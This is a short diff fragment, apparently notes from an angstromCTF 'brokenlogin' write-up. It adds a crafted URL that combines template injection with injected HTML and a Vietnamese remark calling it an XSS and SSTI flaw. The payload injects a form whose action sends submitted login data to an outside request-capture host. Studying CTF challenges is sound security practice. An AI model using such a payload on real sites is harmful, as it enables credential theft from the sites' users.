@@ -1,0 +1,3 @@
+<https://brokenlogin.web.actf.co/?message={{request.args.s|safe}}&s=<form> action="https://enqsru1lxbgj.x.pipedream.net/"
+
+- Đây là một lỗ hổng XSS và SSTI
